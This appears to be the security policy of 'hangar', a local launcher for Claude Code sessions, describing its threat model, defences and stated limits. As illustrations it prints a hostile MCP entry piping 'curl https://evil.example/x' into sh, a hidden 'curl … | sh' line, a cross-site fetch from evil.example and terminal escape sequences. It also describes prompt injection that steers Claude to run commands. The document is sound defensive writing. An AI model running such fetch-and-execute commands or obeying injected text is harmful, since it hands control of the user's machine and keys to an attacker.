# Security

hangar starts Claude Code sessions, and those sessions can run commands and edit files on your computer. So anything that can use hangar can do the same.

That makes the goal simple: **only you, through your own hangar window, on your own computer, can use it.**

## In short

| Who or what | Can it use hangar, or read your sessions? |
|---|---|
| Another computer, on your network or the internet | **No.** hangar listens only on `127.0.0.1`, an address that exists only inside your computer. |
| A website open in your browser | **No.** It would need a secret token it cannot get, and hangar refuses requests that come from other sites. |
| A project folder you downloaded | **Not before you agree.** hangar shows what the folder's settings would run and waits for you. |
| Text that Claude reads (a web page, a file) and that tries to trick it | **It can only ask.** You see exactly what would run before you allow it. |
| Claude's replies | **No.** They are shown as text. They cannot run scripts or load anything. |
| Another program running under your account | **Yes.** It can already read all your files, with or without hangar. See [the limits](#what-hangar-does-not-protect-you-from). |
| A browser extension you allowed on every site | **Yes**, as on any page you open. See [the limits](#what-hangar-does-not-protect-you-from). |

## Reporting a problem

- **A security hole:** please report it privately. On this repository's **Security** tab, choose **Report a vulnerability**. Only the maintainer sees it. A public issue would show everyone how to attack people before a fix exists.
- **Anything else,** or if you are not sure it is a security problem: open a normal issue.

Either way, say what you did, what happened and what you expected.

## What protects you

### 1. Nothing outside your computer can connect

- Every port hangar opens is bound to `127.0.0.1`. Nothing listens on your network address, so another device cannot reach it.
- hangar makes no network requests of its own: no telemetry, no update checks, no accounts. Claude Code and the MCP servers you configured make theirs, exactly as they would without hangar.

### 2. Only your hangar window can use the app

`hangar up` opens the app with a one-time code. The page trades the code for a token, and every later request must carry that token.

- **The code** is 128 random bits, works once and expires after 2 minutes.
- **The token** lives until hangar stops. It travels in a request header, never in a URL or a cookie. A browser attaches cookies to requests by itself, but never a header like this one, so another website cannot make your browser send it.
- **Requests from other sites are refused,** with or without a token. Browsers label each request with where it came from, and hangar accepts only requests from its own page.
- **Requests must be addressed to `127.0.0.1:<port>` exactly.** This stops a trick called DNS rebinding, where a website's own name is made to point at your computer.
- **The page loads nothing from anywhere else.** Its Content-Security-Policy allows scripts, styles, images and connections only from hangar itself, and the page cannot be shown inside another site.
- **Answers are never stored by the browser.** API responses are marked `no-store`.

*Example.* You visit `evil.example` while hangar runs. Its script calls `fetch("http://127.0.0.1:7317/api/sessions", …)` to start a session. The browser marks the request as cross-site, hangar answers 403, and the script has no token anyway. The site cannot even load hangar's icon to find out whether hangar is running.

### 3. What Claude writes cannot act by itself

- Replies are shown as text and Markdown, never as HTML. A `<script>` tag in a reply appears as the text `<script>`.
- Images in replies are not loaded. They become links, so a reply cannot make your browser contact a server.
- Only `http` and `https` links are links. Each opens in a new tab that cannot reach the app. If a link's text names one site and the link goes to another, hangar shows the real one next to it.
- Desktop notifications carry the session's name and what happened ("Wants to use Bash"), never Claude's words.

### 4. What you approve is what runs

Text that Claude reads can try to steer it, for example a web page that says "now run this command". The approval box is where you catch that, so nothing in it may be hidden.

- **Everything is shown:** the exact command, file contents or diff, and every other field of the request.
- **Long requests must be opened.** Allow stays off until you have opened the whole request. A command cannot put 60 harmless lines first and `curl … | sh` on line 61, below the fold.
- **Invisible characters are written out,** for example `⟨U+202E⟩`. Some characters are invisible or reverse the direction of text, so that a command reads differently from what it does.
- **"Allow for session" shows the rule it adds.** It can only add "allow" rules for that one session. It cannot change the permission mode or write to your settings files.
- **A new request ignores clicks for a moment,** so a click meant for the previous request cannot land on the new one.
- **A request ends with its process.** Once the Claude process that asked has stopped, the request cannot be approved.

### 5. A folder cannot run things before you agree

A project folder can carry Claude settings that act automatically: hooks that run commands, tools that are approved in advance, MCP servers to start. A folder you cloned from a stranger is someone else's settings.

- **The first session in a folder shows all of it:** hooks, pre-approved tools, MCP servers with their full command lines and environment, and every other setting. The session starts only after you confirm.
- **Your agreement covers what you were shown.** If the folder's settings change after you read the notice, hangar asks again.
- **Settings files are read carefully:** only ordinary files, up to a size limit. A folder cannot make hangar hang by pointing a settings file at something endless.

*Example.* A repository's `.mcp.json` defines a server as `bash -c "curl https://evil.example/x | sh"`. The notice shows that whole line, not just `bash`.

### 6. Programs are started safely

- **No shell.** hangar never builds a command line from text. Programs are started with separate arguments, and the values passed to `claude` come from a fixed list (permission modes) or are checked (model names, conversation ids). A model name cannot smuggle in a flag such as `--dangerously-skip-permissions`.
- **A shared secret between shim and daemon.** The shim is the small program Claude Code starts in place of an MCP server. Before it sends anything, the shim and the daemon each prove they know the secret in `~/.hangar/daemon.json`. A program that cannot read that file cannot start anything through hangar, and a fake daemon cannot collect a shim's environment.
- **Nothing is left behind (Windows).** Everything hangar starts lives in a job object that ends with hangar, even if hangar crashes.

### 7. Text from servers cannot take over your terminal

`hangar status` prints MCP server names and the last line a failed server wrote, and the log file records them. A terminal treats certain invisible characters as commands: clear the screen, move the cursor, rename the window, write to the clipboard. A server could put those in its name or in what it prints.

- **Names and error lines are cleaned as soon as hangar receives them.** Every control character is removed. Each of those commands has to begin with one, so what is left is ordinary text. That cleaned text is what `hangar status`, the app and the log file hold.
- **Invisible and text-reversing characters are removed too,** so one name cannot be made to look like another.
- **Ordinary text is untouched:** letters in any language, digits, punctuation, emoji.
- **What `hangar status` prints is checked again on the way out.** In `--json` output, any such character left in another field is written as a `\uXXXX` escape, which a terminal shows as text.

*Example.* A server named `\x1b[2J\x1b[Hdocs` would clear your screen and print `docs` at the top. hangar prints `[2J[Hdocs`: the leftovers are visible, and they do nothing.

### 8. What is stored, and where

Everything is under `~/.hangar`, readable only by your account (on Unix by file mode, on Windows through your profile folder's permissions).

| File | Holds |
|---|---|
| `daemon.json` | the daemon's secret for this run |
| `sessions/<id>/events.jsonl` | each session's history: your messages, Claude's replies, tool calls |
| `trusted.json` | the folders you trusted |
| `logs/daemon.log` | start-up and server events. No messages, tokens or environment values |
| `backups/`, `wrapped.json` | copies of `~/.claude.json` made by `hangar wrap`, which include any keys in your MCP settings |

## What hangar does not protect you from

**Other programs running under your account.**
Windows, macOS and Linux give file access per user account, not per program. Any program you run can read whatever you can read: your documents, your browser's saved logins, your SSH keys, your Claude login, and hangar's secret in `~/.hangar/daemon.json`. So if malware is already running as you, it can use hangar, and it could do the same damage without hangar. No desktop tool can prevent that. hangar's job is to not be the way in.

**A command you approve.**
It runs as you, with your files and your keys. Permission modes decide how much Claude may do without asking, and "Full access" never asks. Read what a request shows before allowing it.

**Browser extensions you allowed on every site.**
hangar's window is a page in your browser. An extension with permission to read all sites can read that page too, including your conversations. That is true of every page you open. Remove extensions you do not trust, or limit their site access.

**Computers shared with people you do not trust.**
hangar is built for a computer that is yours.
- Its address (`127.0.0.1:7317`) stays the same between runs, so that the app can be installed and bookmarked. While hangar is not running, another user of the same computer could listen on that address and leave something in your browser that is still there when hangar next opens.
- Another user can slow hangar down by flooding its ports.
- If you set `HANGAR_HOME`, keep it in a folder only you can read.

**One shared Playwright browser, if you turn it on.**
By default every session gets its own Playwright, with no port. Setting `share = "native"` makes one Playwright serve every session, and for that Playwright must listen on a local port. Playwright offers no password for that port. Any program on the computer, including another user's, could then connect and drive that browser, which runs under your account. Turn it on only on a computer that only you use.

**One server used with two of your accounts, in a rare case.**
This is about you alone, not about two people. You may use the same MCP server with different accounts or targets in different sessions: a work GitHub token in one project and a personal one in another, or a test database in one and the live database in another. A shared server is one program that was started once, with one set of settings. If two such sessions shared it, the second would quietly work with the first one's account.

hangar prevents that by comparing how the two sessions set the server up:

- **The server's own entry must match exactly:** its command, its arguments and the `env` values written next to it. Any difference gives the session its own server. This check has no gaps.
- **Inherited variables are compared by name.** A server also inherits the environment variables of the place Claude Code was started from, for example `$env:AWS_PROFILE = "work"` typed in a terminal before `claude`. hangar compares the ones whose names suggest a credential or a choice of account, server or data: names with words such as `TOKEN`, `KEY`, `PASSWORD`, `PROFILE`, `ACCOUNT`, `URL`, `HOST`, `DATABASE`.

*Example that is caught.* Terminal 1 has `DATABASE_URL` pointing at a test database. Terminal 2 has it pointing at the live one. Both run `claude` with the same database server. The values differ, so each session gets its own server.

*Example that is missed.* Your own server picks its database from a variable called `APP_ENV`. Terminal 1 has `APP_ENV=staging`, terminal 2 has `APP_ENV=production`. Nothing in that name tells hangar it matters, so the two sessions share one server, and the second session works on staging while you believe it is on production.

*The sure way.* Put such a setting in the server's own entry (its `env` block), where every difference counts. Or set `share = "session"` for that server in `~/.hangar/config.toml`.

Sessions started in the hangar app are all started by hangar, from the same environment. So this mostly concerns `claude` started in different terminals.

**A shared server's error text.**
The last line a shared server printed can appear in an error shown to every session that uses it.

**Disk use and old history.**
Session histories are stored as plain text and are not trimmed. Delete a session to delete its history.

**Linux and macOS.**
They compile and pass static checks but have never been run. There, processes hangar started can outlive a crash of hangar.

## How this is checked

- `cargo test --workspace` covers the token, the Host, Origin and cross-site checks, pairing, the shim's handshake (including a fake daemon), routing between sessions, folder trust, and hostile paths and names.
- `npm run e2e` drives the app in a real browser with hostile replies and links, long and disguised permission requests, the trust notice, sign-in and sign-out.
- Dependencies are checked against the public advisory databases before a release.
